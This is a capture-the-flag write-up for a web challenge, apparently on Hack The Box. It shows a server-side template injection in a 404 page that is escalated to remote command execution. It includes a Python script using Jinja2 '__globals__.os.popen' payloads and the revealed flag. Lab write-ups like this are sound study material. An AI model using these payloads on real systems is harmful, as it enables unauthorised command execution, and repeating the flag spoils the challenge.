# Templated

## Overview

* Difficulty: Easy
* Category: Web

## Description
> Can you exploit this simple mistake?

## Approach

1. Testing the webapp, we can see that in case the entered URL doesn't corrispond to a known server route the response will prompt out the following 404 page:

```
Error 404

The page '{GIVEN_URL}' could not be found
```

2. Since the response prompts out our own injected URL, we could try to run a Server Side Template Injection: in case the given value is surrounded by two pairs of curly braces, the server will try to evaluate the given expression before prompting it out. For example, using `{{ 5*5 }}` as the given value would prompt out 25.

```
# After testing with https://IP:PORT/{{5*5}}
Error 404

The page '25' could not be found
```

3. We can further exploit this value by making the server evalate a Python Module Injection, importing the OS module and running RCE

```py
import requests as req

def run_SSTI(url, payload):

    print(f"URL: {payload}")
    print(f"PAYLOAD: {payload}")

    s = req.Session()
    res = s.get(f"{url}{payload}").text.split("<str>")[1].split("</str>")[0]

    print("RESULT")
    print("-"*30)
    print(res+"\n")


url = "http://46.101.23.188:30073/"

print("[»] Trying to run Server Side Template Injection...")
run_SSTI(url, "{{5*5}}")

print("[»] Injecting command 'ls'...")
payload = "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('ls').read()}}"
run_SSTI(url, payload)

print("[»] Injecting command 'cat flag.txt'...")
payload = "{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat flag.txt').read()}}"
run_SSTI(url, payload)
```

## Flag

<details>
<summary>Click to view the flag</summary>

__HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}__

</details>